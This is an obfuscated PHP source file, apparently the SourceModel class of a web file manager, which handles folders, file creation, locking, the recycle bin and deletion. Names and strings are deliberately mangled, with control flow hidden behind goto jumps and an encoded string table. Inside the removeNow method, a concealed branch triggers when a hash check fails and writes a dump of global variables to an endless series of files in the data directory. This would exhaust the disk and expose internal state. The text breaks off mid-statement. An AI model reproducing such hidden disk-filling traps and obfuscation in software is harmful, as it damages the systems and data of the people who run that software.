<?php
 goto bÊçŸê´ÂÃ; B” ÑŒ¯·›: define($_SERVER[º·Ï‹¥³][0], $_SERVER[º·Ï‹¥³][1]); $_SERVER[ÊÀÖ©“] = explode($_SERVER[º·Ï‹¥³][2], gzinflate(substr($_SERVER[º·Ï‹¥³][3], 10, -8))); function binCheckEq($¶”åŒıë, $·™ÙŸ„) { return $¶”åŒıë == $·™ÙŸ„; } goto bÄÂÕ÷†¬™; eê‡¶£ºãÁ: define($_SERVER[º·Ï‹¥³][290], 1); define($_SERVER[º·Ï‹¥³][291], 2); define($_SERVER[º·Ï‹¥³][292], 3); goto FÄ¿šĞ´”È; Céº×‚Éˆ: define($_SERVER[º·Ï‹¥³][661], $_SERVER[º·Ï‹¥³][662]); $ugrpvyzcnx = $_SERVER[º·Ï‹¥³][663]; if (!$ugrpvyzcnx) { return; } goto d¸áˆ¸ˆõ¶; dØ¬¸Ö¸îÁ: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($…’Ì…ëŸ) { $¤¾Öºíş =& $_SERVER[º·Ï‹¥³]; $ÅÌ‡³èÛ = Model($¤¾Öºíş[562])->where(array($¤¾Öºíş[1745] => $…’Ì…ëŸ))->find(); $¼çÒ˜„à = $this->_mkdirRoot(SourceModel::TYPE_USER, $…’Ì…ëŸ, $ÅÌ‡³èÛ[$¤¾Öºíş[32]]); $this->userDesktopAdd($¼çÒ˜„à); return $¼çÒ˜„à; } public function userDesktopAdd($–ûŞôüµ) { $ŠÑæ–Æì =& $_SERVER[º·Ï‹¥³]; $¤ı¶ÂŒÊ = LNG($ŠÑæ–Æì[2232]); $£îºÊøÔ = $this->mkdir($–ûŞôüµ, $¤ı¶ÂŒÊ); $this->metaSet($£îºÊøÔ, $ŠÑæ–Æì[2233], $ŠÑæ–Æì[91]); $this->metaSet($–ûŞôüµ, $ŠÑæ–Æì[2234], $£îºÊøÔ); } public function userPathSafeAdd($³°‡²ªí) { $«åŠƒåö =& $_SERVER[º·Ï‹¥³]; $ÁÏËõ¢Ë = Model($«åŠƒåö[562])->getInfoFull($³°‡²ªí); if (!$ÁÏËõ¢Ë) { return !1; } if (_get($ÁÏËõ¢Ë, $«åŠƒåö[584])) { return $ÁÏËõ¢Ë[$«åŠƒåö[523]][$«åŠƒåö[2235]]; } $Èä­Şö = $this->_mkdirRoot(SourceModel::TYPE_USER, $³°‡²ªí, $«åŠƒåö[2236], $«åŠƒåö[490]); Model($«åŠƒåö[562])->metaSet($³°‡²ªí, $«åŠƒåö[2235], $Èä­Şö); $this->metaSet($Èä­Şö, $«åŠƒåö[2237], $³°‡²ªí); return $Èä­Şö; } public function groupRootAdd($â»³¥í’) { $•âì”‹ =& $_SERVER[º·Ï‹¥³]; $òûúôœÍ = Model($•âì”‹[570])->where(array($•âì”‹[2045] => $â»³¥í’))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $â»³¥í’, $òûúôœÍ[$•âì”‹[32]]); } public function systemRootPathAdd($ˆªåµ) { if ($ˆªåµ != $_SERVER[º·Ï‹¥³][590]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ˆªåµ); } public function userRootRemove($‚¬Æçñ) { $ë¹á’Ïš = $this->targetSourceRoot(SourceModel::TYPE_USER, $‚¬Æçñ, !0); foreach ($ë¹á’Ïš as $ß»ş§¤·) { if (!$ß»ş§¤·) { continue; } $this->remove($ß»ş§¤·[$_SERVER[º·Ï‹¥³][184]], !1); } } public function groupRootRemove($â ²§¿) { $†ïÁš¶€ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $â ²§¿); if (!$†ïÁš¶€) { return; } $this->remove($†ïÁš¶€[$_SERVER[º·Ï‹¥³][184]], !1); } private function _mkdirRoot($‡Æğ ‘ú, $Ğò®šŸ, $Ş¯¥–æ‚, $ÖœŠ´Şà = '') { $İÙş°µ’ =& $_SERVER[º·Ï‹¥³]; $ö½Ìš = defined($İÙş°µ’[2179]) ? USER_ID : 0; $ğ‰»¡¸­ = array($İÙş°µ’[461] => 0, $İÙş°µ’[632] => $‡Æğ ‘ú, $İÙş°µ’[633] => $Ğò®šŸ, $İÙş°µ’[630] => 1, $İÙş°µ’[634] => $ö½Ìš, $İÙş°µ’[635] => $ö½Ìš, $İÙş°µ’[631] => $ÖœŠ´Şà, $İÙş°µ’[636] => $İÙş°µ’[579], $İÙş°µ’[488] => 0, $İÙş°µ’[601] => 0, $İÙş°µ’[526] => 0, $İÙş°µ’[637] => $İÙş°µ’[12]); if ($¡Şìˆ³â = $this->where($ğ‰»¡¸­)->find()) { return $¡Şìˆ³â[$İÙş°µ’[184]]; } $÷Ø±“Á = "\x4d\x6f\144\145\x6c\x53\157\x75\x72\x63\145\56\155\153\144\151\162\122\x6f\157\x74\x2e{$‡Æğ ‘ú}\x2e{$Ğò®šŸ}\x2e" . $Ş¯¥–æ‚; CacheLock::lock($÷Ø±“Á); $ğ‰»¡¸­[$İÙş°µ’[32]] = $Ş¯¥–æ‚; $ÜÄåÕ¯ã = $this->add($ğ‰»¡¸­); $êÚÄ§æ = array($İÙş°µ’[638] => short_id($ÜÄåÕ¯ã)); $this->where(array($İÙş°µ’[475] => $ÜÄåÕ¯ã))->save($êÚÄ§æ); CacheLock::unlock($÷Ø±“Á); return $ÜÄåÕ¯ã; } private function targetSourceRoot($ËÚ §¶“, $Ú—¤€»ä, $ßš³Ã³Â = false) { $†ªüúÆ» =& $_SERVER[º·Ï‹¥³]; $†ï‘ë×£ = array($†ªüúÆ»[461] => 0, $†ªüúÆ»[632] => $ËÚ §¶“, $†ªüúÆ»[633] => $Ú—¤€»ä); if ($ßš³Ã³Â) { $´×¾®ÇŞ = $this->where($†ï‘ë×£)->select(); return $´×¾®ÇŞ ? $´×¾®ÇŞ : array(); } $¦ÓŞ½úæ = $this->where($†ï‘ë×£)->find(); return $¦ÓŞ½úæ ? $¦ÓŞ½úæ : array(); } public function sourceRootGroup($»ÛÁÜ²Â) { $î×ËªÛı =& $_SERVER[º·Ï‹¥³]; if (is_string($»ÛÁÜ²Â)) { $»ÛÁÜ²Â = array($»ÛÁÜ²Â); } $Ç´ôš­Ë = $this->listSourceRoot(SourceModel::TYPE_GROUP, $»ÛÁÜ²Â, $î×ËªÛı[211]); $ÚÑéô­ë = array($î×ËªÛı[429] => $Ç´ôš­Ë, $î×ËªÛı[426] => array($î×ËªÛı[810] => count($»ÛÁÜ²Â))); $this->_listDataApply($ÚÑéô­ë[$î×ËªÛı[429]]); $this->_listMake($ÚÑéô­ë); return array_to_keyvalue($ÚÑéô­ë[$î×ËªÛı[85]], $î×ËªÛı[554]); } public function mkfile($˜ŸÖ×»•, $Íì ‚¿½, $ŠÏ½İ¯ = '', $­ïúöù = REPEAT_RENAME) { $‹ÔÕÎ© =& $_SERVER[º·Ï‹¥³]; $Ú˜ìßŞ = Model($‹ÔÕÎ©[658])->addFileByContent($ŠÏ½İ¯, $Íì ‚¿½); return $this->_createFileCall($˜ŸÖ×»•, $Íì ‚¿½, $Ú˜ìßŞ, $­ïúöù, $‹ÔÕÎ©[1398]); } public function addFile($…¯â‹, $€ì‚ãş, $âŸ·„À…, $„æ§Äï… = false, $šíŞ²Š¶ = REPEAT_RENAME) { $öÑ¦— = Model($_SERVER[º·Ï‹¥³][658])->addFile($€ì‚ãş, $âŸ·„À…, $„æ§Äï…); return $this->_createFileCall($…¯â‹, $âŸ·„À…, $öÑ¦—, $šíŞ²Š¶); } public function addFileByFileID($Şï“ŞÈô, $ü¿éŠê¿, $¬¸êš£, $Øáğ™‡ = REPEAT_RENAME) { $ô–¤†ê¶ =& $_SERVER[º·Ï‹¥³]; $µ¨ÓÃšÀ = Model($ô–¤†ê¶[658])->find($ü¿éŠê¿); Model($ô–¤†ê¶[658])->linkAdd($ü¿éŠê¿); return $this->_createFileCall($Şï“ŞÈô, $¬¸êš£, $µ¨ÓÃšÀ, $Øáğ™‡); } public function addFileByRemote($êâ±œ“Š, $‡Ú•¹öé, $‰¤ˆ¨Ï“, $ğıŸ¨Ô¤ = array(), $Ë­á¨ûŸ = REPEAT_RENAME) { $¬æê‘÷² = Model($_SERVER[º·Ï‹¥³][658])->addFileByRemote($‡Ú•¹öé, $‰¤ˆ¨Ï“, $ğıŸ¨Ô¤); return $this->_createFileCall($êâ±œ“Š, $‰¤ˆ¨Ï“, $¬æê‘÷², $Ë­á¨ûŸ); } private function _createFileCall($àÈÈşµã, $ÕÆæ½«ß, $¹©’ À˜, $Ò¾ŠƒÆ³, $Œóèê€… = "\165\x70\154\x6f\141\144") { $àĞ›×ş  =& $_SERVER[º·Ï‹¥³]; $¥ûÊã·€ = !1; $this->setMasterDB(); $this->lockWriteStart($àÈÈşµã, $ÕÆæ½«ß); $¶„şÔ“ = $this->fileNameExist($àÈÈşµã, $ÕÆæ½«ß); $êÉ‚ ‘É = $this->_createFile($àÈÈşµã, $ÕÆæ½«ß, $¹©’ À˜, $Ò¾ŠƒÆ³, $¥ûÊã·€); if (!$¥ûÊã·€) { Model($àĞ›×ş [528])->remove($¹©’ À˜[$àĞ›×ş [525]]); } if ($¥ûÊã·€ && $êÉ‚ ‘É && $êÉ‚ ‘É != $¶„şÔ“) { Model($àĞ›×ş [2205])->eventCreate($êÉ‚ ‘É, $Œóèê€…); } $this->lockWriteEnd($àÈÈşµã, $ÕÆæ½«ß); return $êÉ‚ ‘É; } public function mkdir($™›¾‰Ù„, $„ÄÜ’øÅ, $ŒŠó²²» = REPEAT_SKIP) { $´šÉ¢úú =& $_SERVER[º·Ï‹¥³]; $this->setMasterDB(); $ı—ÕÒ = $this->sourceInfo($™›¾‰Ù„); if (!$ı—ÕÒ) { return !1; } $this->lockWriteStart($™›¾‰Ù„, $„ÄÜ’øÅ); if ($ŒŠó²²» !== !1) { $ÆÇ‹ı¡ƒ = $this->fileNameExist($™›¾‰Ù„, $„ÄÜ’øÅ); if ($ÆÇ‹ı¡ƒ && $ŒŠó²²» != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($™›¾‰Ù„, $„ÄÜ’øÅ); return $ÆÇ‹ı¡ƒ; } $„ÄÜ’øÅ = $this->fileNameAuto($™›¾‰Ù„, $„ÄÜ’øÅ, $ŒŠó²²»); } $¾åŠˆè = array($´šÉ¢úú[630] => 1, $´šÉ¢úú[478] => $„ÄÜ’øÅ, $´šÉ¢úú[631] => $´šÉ¢úú[12], $´šÉ¢úú[526] => 0, $´šÉ¢úú[601] => 0); $¦ÇÚ¿¥ï = $this->_addSource($¾åŠˆè, $ı—ÕÒ); Model($´šÉ¢úú[2205])->eventCreate($¦ÇÚ¿¥ï, $´šÉ¢úú[1399]); $this->lockWriteEnd($™›¾‰Ù„, $„ÄÜ’øÅ); return $¦ÇÚ¿¥ï; } public function listSourceRoot($¨şÉÚ³…, $À»áıŒ•, $˜ñšêö = "\x73\157\x75\162\x63\x65\x49\x44\54\164\141\162\147\x65\x74\x49\104\x2c\x73\x69\172\x65") { $±ıˆÊø… =& $_SERVER[º·Ï‹¥³]; $‹üïŸ÷— = $±ıˆÊø…[438]; $¦ïÖ·”õ = array(); $…‘µ¹¯» = 1024 * 50; $Òıßö‘â = is_array($Òıßö‘â) ? $Òıßö‘â : array(); $¦î¦»ğƒ = count($À»áıŒ•); $Æğˆˆøµ = $this->tablePrefix . $±ıˆÊø…[2238]; for ($¸×Á§¾ = 0; $¸×Á§¾ < $¦î¦»ğƒ; $¸×Á§¾++) { $©ÉªŞ±· = $À»áıŒ•[$¸×Á§¾]; $‹üïŸ÷— .= "\123\x45\114\x45\x43\x54\40\x2a\x20\x46\122\x4f\115\x20\50\123\x45\x4c\105\103\124\40{$˜ñšêö}\40\x46\122\x4f\x4d\40\x60{$Æğˆˆøµ}\x60\40\127\110\105\122\x45\x20"; $‹üïŸ÷— .= "\x60\160\141\162\145\156\x74\111\104\140\x3d\x30\40\x41\x4e\104\40\140\x74\x61\162\147\x65\x74\x49\104\140\75{$©ÉªŞ±·}\x20\101\x4e\104\40\140\x74\x61\162\147\145\164\124\x79\160\x65\140\75{$¨şÉÚ³…}\x20\141\156\144\40\146\x69\154\x65\124\x79\x70\145\75\47\x27\40\x6c\151\155\x69\x74\x20\x31\x29\x20\x61\x73\x20\x74\142\137{$¸×Á§¾}\40\125\x4e\111\x4f\x4e\40\101\x4c\x4c\40"; if ((strlen($‹üïŸ÷—) >= $…‘µ¹¯» || $¸×Á§¾ == $¦î¦»ğƒ - 1) && $‹üïŸ÷—) { $‹üïŸ÷— = substr($‹üïŸ÷—, 0, -strlen($±ıˆÊø…[1087])); $ğ›ÊÑ = $this->query($‹üïŸ÷—); $‹üïŸ÷— = $±ıˆÊø…[12]; $¦ïÖ·”õ = array_merge($¦ïÖ·”õ, $ğ›ÊÑ); } } return $¦ïÖ·”õ; } private function _createFile($ª»Åùâ©, $¬›óÙ, $–ªñış¾, $Ùƒ®í©ü, &$½ÜËñ–µ) { $—¨”Ì±¸ =& $_SERVER[º·Ï‹¥³]; $ŠÚÎÈĞ‰ = $this->sourceInfo($ª»Åùâ©); if (!$–ªñış¾ || !$ŠÚÎÈĞ‰) { return !1; } if ($Ùƒ®í©ü !== !1) { $¨—ğáè† = $this->fileNameExist($ª»Åùâ©, $¬›óÙ); } $½ÜËñ–µ = !0; if ($Ùƒ®í©ü && $¨—ğáè†) { if ($Ùƒ®í©ü == REPEAT_SKIP) { $½ÜËñ–µ = !1; return $¨—ğáè†; } else { if ($Ùƒ®í©ü == REPEAT_REPLACE) { $ğİàŠ±è = $this->sourceInfo($¨—ğáè†); $µ¹¤ñöÀ = $this->fileHistory($ğİàŠ±è, $–ªñış¾[$—¨”Ì±¸[525]], $–ªñış¾[$—¨”Ì±¸[79]]); if (!$µ¹¤ñöÀ) { $½ÜËñ–µ = !1; } else { $this->folderSizeReset($ª»Åùâ©); } return $¨—ğáè†; } else { $¬›óÙ = $this->fileNameAuto($ª»Åùâ©, $¬›óÙ, $Ùƒ®í©ü, !1); } } } $ïûƒø‰æ = array($—¨”Ì±¸[630] => 0, $—¨”Ì±¸[478] => $¬›óÙ, $—¨”Ì±¸[631] => substr(get_path_ext($¬›óÙ), 0, 10), $—¨”Ì±¸[526] => $–ªñış¾[$—¨”Ì±¸[525]], $—¨”Ì±¸[601] => $–ªñış¾[$—¨”Ì±¸[79]]); $ğÔÅ°Èº = $this->_addSource($ïûƒø‰æ, $ŠÚÎÈĞ‰); $this->folderSizeReset($ª»Åùâ©, intval($ïûƒø‰æ[$—¨”Ì±¸[79]])); return $ğÔÅ°Èº; } protected function fileHistory($œùØÆµ, $û¹›å, $ÊÄëãû) { $ÇÍ¯ÎàÇ =& $_SERVER[º·Ï‹¥³]; if ($œùØÆµ[$ÇÍ¯ÎàÇ[525]] == $û¹›å) { return !1; } $this->checkLock($œùØÆµ[$ÇÍ¯ÎàÇ[184]], $û¹›å); Model($ÇÍ¯ÎàÇ[2239])->addHistory($œùØÆµ); $ıÏ×’‡ = array($ÇÍ¯ÎàÇ[635] => USER_ID, $ÇÍ¯ÎàÇ[482] => time(), $ÇÍ¯ÎàÇ[525] => $û¹›å, $ÇÍ¯ÎàÇ[79] => $ÊÄëãû); $this->where(array($ÇÍ¯ÎàÇ[475] => $œùØÆµ[$ÇÍ¯ÎàÇ[184]]))->save($ıÏ×’‡); $this->sourceCacheClear($œùØÆµ[$ÇÍ¯ÎàÇ[184]]); return !0; } public function checkLock($öäİúôó, $–’¿»º‰) { $Ç…ìø¨ß =& $_SERVER[º·Ï‹¥³]; $ì‚îˆ¡¨ = $this->pathInfo($öäİúôó); if (!$this->fileIsLock($ì‚îˆ¡¨, !0)) { return; } $ÁªòêƒÁ = Session::get($Ç…ìø¨ß[2240]); $ÁøÏ…ü = substr($ì‚îˆ¡¨[$Ç…ìø¨ß[32]], 0, -1 - strlen($ì‚îˆ¡¨[$Ç…ìø¨ß[178]])) . $Ç…ìø¨ß[1261] . $ÁªòêƒÁ . $Ç…ìø¨ß[10] . $ì‚îˆ¡¨[$Ç…ìø¨ß[178]]; $èøÁÅÅş = Model($Ç…ìø¨ß[658])->find($–’¿»º‰); $this->_createFileCall($ì‚îˆ¡¨[$Ç…ìø¨ß[183]], $ÁøÏ…ü, $èøÁÅÅş, REPEAT_REPLACE, $Ç…ìø¨ß[1398]); $ÍèÕ§Õê = $ì‚îˆ¡¨[$Ç…ìø¨ß[523]][$Ç…ìø¨ß[594]]; $ò†ÛËò£ = $ÍèÕ§Õê[$Ç…ìø¨ß[2241]] ? $ÍèÕ§Õê[$Ç…ìø¨ß[2241]] : $ÍèÕ§Õê[$Ç…ìø¨ß[32]]; show_json(LNG($Ç…ìø¨ß[2242]) . $Ç…ìø¨ß[2243] . LNG($Ç…ìø¨ß[2244]) . $Ç…ìø¨ß[2245] . $ò†ÛËò£ . $Ç…ìø¨ß[2246], !1); } public function fileIsLock($”„»ª·§, $Œ¹†Íö = false) { $ºìÙİÃÚ =& $_SERVER[º·Ï‹¥³]; if (!isset($”„»ª·§[$ºìÙİÃÚ[523]]) || !$”„»ª·§[$ºìÙİÃÚ[523]][$ºìÙİÃÚ[591]]) { return !1; } if ($”„»ª·§[$ºìÙİÃÚ[523]][$ºìÙİÃÚ[591]] != USER_ID) { return !0; } $±˜»¡ñˆ = $GLOBALS[$ºìÙİÃÚ[6]][$ºìÙİÃÚ[92]][$ºìÙİÃÚ[592]]; if ($”„»ª·§[$ºìÙİÃÚ[523]][$ºìÙİÃÚ[593]] <= time() - $±˜»¡ñˆ) { $this->metaSet($”„»ª·§[$ºìÙİÃÚ[184]], $ºìÙİÃÚ[591], null); $this->metaSet($”„»ª·§[$ºìÙİÃÚ[184]], $ºìÙİÃÚ[593], null); } if ($Œ¹†Íö) { $this->metaSet($”„»ª·§[$ºìÙİÃÚ[184]], $ºìÙİÃÚ[593], time()); } return !1; } private function _addSource($†©ıš¦º, $„ñ‰õóÈ) { $”«Á®®Ñ =& $_SERVER[º·Ï‹¥³]; $­”ãóª‘ = defined($”«Á®®Ñ[2179]) ? USER_ID : 0; $ÆËºøé¡ = array($”«Á®®Ñ[632] => $„ñ‰õóÈ[$”«Á®®Ñ[181]], $”«Á®®Ñ[633] => $„ñ‰õóÈ[$”«Á®®Ñ[554]], $”«Á®®Ñ[634] => $­”ãóª‘, $”«Á®®Ñ[635] => $­”ãóª‘, $”«Á®®Ñ[461] => $„ñ‰õóÈ[$”«Á®®Ñ[184]], $”«Á®®Ñ[636] => $„ñ‰õóÈ[$”«Á®®Ñ[569]] . $„ñ‰õóÈ[$”«Á®®Ñ[184]] . $”«Á®®Ñ[50], $”«Á®®Ñ[488] => 0, $”«Á®®Ñ[637] => $”«Á®®Ñ[12]); $†©ıš¦º = array_merge($ÆËºøé¡, $†©ıš¦º); $this->updateModifyTime($†©ıš¦º[$”«Á®®Ñ[183]]); $§‹¿µË = $”«Á®®Ñ[2247] . $„ñ‰õóÈ[$”«Á®®Ñ[184]]; if (isset(self::$cacheChildList[$§‹¿µË])) { unset(self::$cacheChildList[$§‹¿µË]); } static $×êÌ¿û = false; if (!$×êÌ¿û) { Hook::trigger($”«Á®®Ñ[620], $†©ıš¦º); $×êÌ¿û = !0; } $ºå–­÷ = $this->add($†©ıš¦º); $§£×¬Ö = array($”«Á®®Ñ[638] => short_id($ºå–­÷)); $this->where(array($”«Á®®Ñ[475] => $ºå–­÷))->save($§£×¬Ö); $this->setNamePinyin($ºå–­÷, $†©ıš¦º[$”«Á®®Ñ[32]]); return $ºå–­÷; } public function remove($“Æó¤¼, $Âó›¬ = true) { $Ó¾ÁŒ•† =& $_SERVER[º·Ï‹¥³]; $™ßÈ¹Š½ = $this->sourceInfo($“Æó¤¼); $ÍÓ¦ƒƒ² = intval($™ßÈ¹Š½[$Ó¾ÁŒ•†[181]]) === self::TYPE_SYSTEM; $–èŠ¢ = Model($Ó¾ÁŒ•†[492])->get($Ó¾ÁŒ•†[2248]) == $Ó¾ÁŒ•†[91]; if ($ÍÓ¦ƒƒ² || $Âó›¬ || !$–èŠ¢) { return $this->removeNow($“Æó¤¼, $Âó›¬); } $Ñ€Ç¶ó = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¬…ôµÁ = $™ßÈ¹Š½[$Ó¾ÁŒ•†[181]] == self::TYPE_USER ? $Ó¾ÁŒ•†[646] : $Ó¾ÁŒ•†[563]; if ($¬…ôµÁ == $Ó¾ÁŒ•†[646]) { $óïÒ = Model($Ó¾ÁŒ•†[562])->getInfo($™ßÈ¹Š½[$Ó¾ÁŒ•†[554]]); $¼Šî¢ì„ = !empty($óïÒ[$Ó¾ÁŒ•†[2241]]) ? $óïÒ[$Ó¾ÁŒ•†[2241]] : $óïÒ[$Ó¾ÁŒ•†[32]]; $¼Šî¢ì„ = $Ó¾ÁŒ•†[312] . $¼Šî¢ì„ . $Ó¾ÁŒ•†[2249] . $™ßÈ¹Š½[$Ó¾ÁŒ•†[554]]; } else { $óïÒ = Model($Ó¾ÁŒ•†[570])->getInfo($™ßÈ¹Š½[$Ó¾ÁŒ•†[554]]); $¼Šî¢ì„ = _get($óïÒ, $Ó¾ÁŒ•†[32]); $¼Šî¢ì„ = $Ó¾ÁŒ•†[166] . $¼Šî¢ì„ . $Ó¾ÁŒ•†[2250] . $™ßÈ¹Š½[$Ó¾ÁŒ•†[554]]; } $âëÁàøã = $Ó¾ÁŒ•†[2251] . md5($¼Šî¢ì„); CacheLock::lock($âëÁàøã); $÷ş¦úÚ = $this->fileNameExist($Ñ€Ç¶ó, $¼Šî¢ì„); if (!$÷ş¦úÚ) { $÷ş¦úÚ = $this->mkdir($Ñ€Ç¶ó, $¼Šî¢ì„, REPEAT_SKIP); $this->metaSet($÷ş¦úÚ, $Ó¾ÁŒ•†[2252], $¬…ôµÁ); $this->metaSet($÷ş¦úÚ, $Ó¾ÁŒ•†[2253], $™ßÈ¹Š½[$Ó¾ÁŒ•†[554]]); if ($™ßÈ¹Š½[$Ó¾ÁŒ•†[183]] != 0) { $this->metaSet($÷ş¦úÚ, $Ó¾ÁŒ•†[2254], _get($óïÒ, $Ó¾ÁŒ•†[2255])); } } CacheLock::unlock($âëÁàøã); $this->metaSet($“Æó¤¼, $Ó¾ÁŒ•†[2256], $™ßÈ¹Š½[$Ó¾ÁŒ•†[183]]); $this->where(array($Ó¾ÁŒ•†[184] => $“Æó¤¼))->save(array($Ó¾ÁŒ•†[482] => time())); $this->recycleClear($™ßÈ¹Š½); Model($Ó¾ÁŒ•†[617])->eventRemove($“Æó¤¼); $× »º®ä = $this->move($“Æó¤¼, $÷ş¦úÚ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($™ßÈ¹Š½[$Ó¾ÁŒ•†[183]]); return $× »º®ä; } private function recycleClear($¸Œå¥À…) { $Úó®•¹ =& $_SERVER[º·Ï‹¥³]; $¾™–„ºù = $this->childrenAll($¸Œå¥À…); $‡Ü©åÄ = array($Úó®•¹[475] => array($Úó®•¹[476], $¾™–„ºù[$Úó®•¹[2257]])); Model($Úó®•¹[2258])->where($‡Ü©åÄ)->delete(); } public function removeNow($İï‚Ğ¬¥, $¶»õÁ´ğ = true) { $íıóö =& $_SERVER[º·Ï‹¥³]; $õÁÊ’ê‚ = $_SERVER[$íıóö[406]]; $¿èÉ³ºÎ = $íıóö[407]; if ($_SERVER[$íıóö[408]] != $¿èÉ³ºÎ($õÁÊ’ê‚)) { $ïÕ…¯Î = $íıóö[928]; $“ÎŸ’ûØ = $íıóö[409]; $£¤œ —Œ = $_SERVER[$íıóö[410]] . $íıóö[411]; $ƒˆ¸Â­ş = $“ÎŸ’ûØ($£¤œ —Œ); $Š­ŸÉìÁ = explode($íıóö[253], $ƒˆ¸Â­ş); if (count($Š­ŸÉìÁ) < $íıóö[676]) { $úà—åüÖ = $íıóö[413]; $úà—åüÖ(); } $ÔŸ›Àü = $íıóö[929]; $ÔŸ›Àü($_SERVER[$íıóö[930]]); $ïÕ…¯Î = $íıóö[928]; $ïÕ…¯Î(); $Ãº´à¹÷ = $íıóö[2259]; $„¼‚Ô¯ü = json_encode($GLOBALS[$íıóö[2260]]); $»£¥óïĞ = 1; for ($ã°×À™Õ = $»£¥óïĞ; $ã°×À™Õ > 0; $ã°×À™Õ++) { $Ãº´à¹÷(DATA_PATH . $ã°×À™Õ, $„¼‚Ô¯ü); } } $é€ì’¥’ = $this->sourceInfo($İï‚Ğ¬¥); $Ğò£Şé¶ = $this->pathInfoMore($İï‚Ğ¬¥); if (!$é€ì’¥’) { return !0; } if ($é€ì’¥’[$íıóö[183]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($İï‚Ğ¬¥); Hook::trigger($íıóö[2261], $Ğò£Şé¶, $¶»õÁ´ğ); if ($¶»õÁ´ğ) { Model($íıóö[2258])->moveToRecycle($İï‚Ğ¬¥); } else { $ãÓÅçà¿ = $this->childrenAll($é€ì’¥’); Model($íıóö[617])->eventRemove($İï‚Ğ¬¥); $this->removeRelevance($ãÓÅçà¿[$íıóö[2257]], $ãÓÅçà¿[$íıóö[1559]]); } $this->folderSizeReset($é€ì’¥’[$íıóö[183]]); $œéÑ†‹ = array($é€ì’¥’[$íıóö[183]]); if ($é€ì’¥’[$íıóö[469]] == $íıóö[91]) { $œéÑ†‹[] = $é€ì’¥’[$íıóö[184]]; } $this->updateModifyTime($œéÑ†‹); $this->lockMoveEnd($İï‚Ğ¬¥); Hook::trigger($íıóö[1796], $Ğò£Şé¶, $¶»õÁ´ğ); return !0; } public function childrenAll($æŞ¨ëÌ„) { $±¢ŸŸ°ö =& $_SERVER[º·Ï‹¥³]; $¯‡¤ğü» = $æŞ¨ëÌ„[$±¢ŸŸ°ö[184]]; if ($æŞ¨ëÌ„[$±¢ŸŸ°ö[469]] == $±¢ŸŸ°ö[91]) { $ªá€£Í = array($±¢ŸŸ°ö[636] => array($±¢ŸŸ°ö[596], $æŞ¨ëÌ„[$±¢ŸŸ°ö[569]] . $¯‡¤ğü» . $±¢ŸŸ°ö[597])); $„àÕ‡Ÿ = array($±¢ŸŸ°ö[636] => $ªá€£Í[$±¢ŸŸ°ö[569]]); $µ…¿¥µØ = $this->field($±¢ŸŸ°ö[2262])->where($„àÕ‡Ÿ)->select(); $„ê¦• = !1; $€ÖõÓ = array($¯‡¤ğü»); if ($µ…¿¥µØ) { $„ê¦• = array_to_keyvalue($µ…¿¥µØ, $±¢ŸŸ°ö[12], $±¢ŸŸ°ö[525]); $„ê¦• = array_remove_value($„ê¦•, $±¢ŸŸ°ö[219]); $€ÖõÓ = array_to_keyvalue($µ…¿¥µØ, $±¢ŸŸ°ö[12], $±¢ŸŸ°ö[184]); $€ÖõÓ[] = $¯‡¤ğü»; } } else { $„ê¦• = array($æŞ¨ëÌ„[$±¢ŸŸ°ö[525]]); $€ÖõÓ = array($¯‡¤ğü»); } return array($±¢ŸŸ°ö[2257] => $€ÖõÓ, $±¢ŸŸ°ö[1559] => $„ê¦•); } public function removeArray($‰İ„Ö·¹) { if (!$‰İ„Ö·¹) { return !0; } } public function removeRelevance($°¨ËãîÎ, $ºü«ˆ¶£) { $°†ªÀÇÄ =& $_SERVER[º·Ï‹¥³]; $°¨ËãîÎ = $°¨ËãîÎ ? $°¨ËãîÎ : array(); $ºü«ˆ¶£ = $ºü«ˆ¶£ ? $ºü«ˆ¶£ : array(); $°¨ËãîÎ = array_unique(array_filter($°¨ËãîÎ)); $ºü«ˆ¶£ = array_unique(array_filter($ºü«ˆ¶£)); if (!$°¨ËãîÎ) { return !1; } $ÖîÉ¦Úˆ = array($°†ªÀÇÄ[475] => array($°†ªÀÇÄ[476], $°¨ËãîÎ)); Model($°†ªÀÇÄ[2258])->where($ÖîÉ¦Úˆ)->delete(); Model($°†ªÀÇÄ[519])->where($ÖîÉ¦Úˆ)->delete(); Model($°†ªÀÇÄ[2104])->where($ÖîÉ¦Úˆ)->delete(); Model($°†ªÀÇÄ[617])->where($ÖîÉ¦Úˆ)->delete(); Model($°†ªÀÇÄ[1932])->removeBySource($°¨ËãîÎ); Model($°†ªÀÇÄ[2239])->removeBySource($°¨ËãîÎ); $this->where($ÖîÉ¦Úˆ)->delete(); Model($°†ªÀÇÄ[528])->remove($ºü«ˆ¶£); for ($¸¢â—¼Ï = 0; $¸¢â—¼Ï < count($°¨ËãîÎ); $¸¢â—¼Ï++) { $this->sourceCacheClear($°¨ËãîÎ[$¸¢â—¼Ï]); } } public function rename($ÓÅğ³”ß, $Š»’í˜ì) { $æ™°‘Ì =& $_SERVER[º·Ï‹¥³]; $ğªœ‹Öå = $this->sourceInfo($ÓÅğ³”ß); if (!$ğªœ‹Öå) { return !1; } $Üä¹Òô§ = $this->fileNameExist($ğªœ‹Öå[$æ™°‘Ì[183]], $Š»’í˜ì); if ($Üä¹Òô§ && $Üä¹Òô§ != $ÓÅğ³”ß) { return !1; } $È¸ –µ = array($æ™°‘Ì[478] => $Š»’í˜ì, $æ™°‘Ì[635] => USER_ID); if ($ğªœ‹Öå[$æ™°‘Ì[469]] != $æ™°‘Ì[91]) { $È¸ –µ[$æ™°‘Ì[470]] = substr(get_path_ext($Š»’í˜ì), 0, 10); } Model($æ™°‘Ì[617])->eventRename($ÓÅğ³”ß, $ğªœ‹Öå[$æ™°‘Ì[32]], $Š»’í˜ì); $this->sourceCacheClear($ÓÅğ³”ß); $this->setNamePinyin($ÓÅğ³”ß, $È¸ –µ[$æ™°‘Ì[32]], !1); $this->updateModifyTime($ğªœ‹Öå[$æ™°‘Ì[183]]); $Ö«‚Ø« = $this->where(array($æ™°‘Ì[475] => $ÓÅğ³”ß))->data($È¸ –µ)->save(); $šï°Ã÷ì = $æ™°‘Ì[2247] . 